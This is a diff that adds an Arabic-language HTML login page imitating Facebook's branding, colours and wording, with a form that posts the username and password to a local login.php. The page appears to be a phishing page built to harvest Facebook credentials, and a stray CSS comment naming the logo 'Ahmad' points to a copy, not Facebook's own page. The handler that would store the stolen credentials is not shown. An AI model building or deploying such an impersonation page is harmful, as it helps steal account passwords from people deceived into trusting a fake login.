@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>facebook</title>
+    <style>
+        /* إعدادات صفحة الجسم */
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background-color: #e9eff1;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        /* حاوية النموذج */
+        .login-container {
+            background-color: white;
+            width: 350px;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        /* تنسيق شعار Ahmad */
+        .logo {
+            font-size: 36px;
+            font-weight: bold;
+            color: #1877f2;
+            margin-bottom: 20px;
+            text-align: left;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        /* تنسيق العنوان */
+        h2 {
+            color: #1877f2;
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+
+        /* تنسيق حقول الإدخال */
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        /* زر تسجيل الدخول */
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            width: 100%;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+        }
+
+        /* تأثير الزر عند التمرير */
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+
+        /* روابط تذكر كلمة المرور والاشتراك */
+        .links {
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .links a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+        }
+
+        .register-link {
+            font-size: 14px;
+            margin-top: 15px;
+        }
+
+        .register-link a {
+            color: #42b72a;
+            text-decoration: none;
+        }
+
+        .register-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* إضافة خط للفيسبوك */
+        .facebook-font {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            font-weight: bold;
+            font-size: 36px;
+            color: #1877f2;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo facebook-font">facebook</div>
+        <h2>تسجيل الدخول إلى facebook</h2>
+        
+        <form action="login.php" method="POST">
+            <input type="text" name="username" placeholder="اسم المستخدم" required><br>
+            <input type="password" name="password" placeholder="كلمة المرور" required><br>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+
+        <div class="links">
+            <a href="#">هل نسيت كلمة المرور؟</a>
+        </div>
+
+        <div class="register-link">
+            <span>ليس لديك حساب؟</span>
+            <a href="#">إنشاء حساب جديد</a>
+        </div>
+    </div>
+</body>
+</html>
